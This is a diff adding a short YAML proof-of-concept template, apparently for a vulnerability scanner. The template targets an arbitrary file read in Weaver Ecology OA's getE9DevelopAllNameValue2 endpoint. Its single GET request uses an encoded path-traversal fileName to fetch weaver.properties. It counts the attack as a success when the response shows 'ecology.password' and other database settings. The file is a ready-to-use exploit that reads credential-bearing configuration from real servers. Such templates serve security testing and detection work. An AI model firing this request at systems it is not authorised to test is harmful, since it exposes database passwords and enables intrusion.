@@ -1,0 +1,20 @@
+id: poc-yaml-weaver-ecology-oa-portaltsogin-file-read
+info:
+  name: 泛微OA getE9DevelopAllNameValue2 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  - 两高一弱
+  finger: weaver
+requests:
+- method: GET
+  path: /api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties
+  expression: 'status_code == 200 &&  contains(body, "ecology.password")
+
+    &&  contains(body, "ecology.charset")
+
+    &&  contains(body, "ecology.maxidletime")
+
+    '
+variables: {}
+transport: http
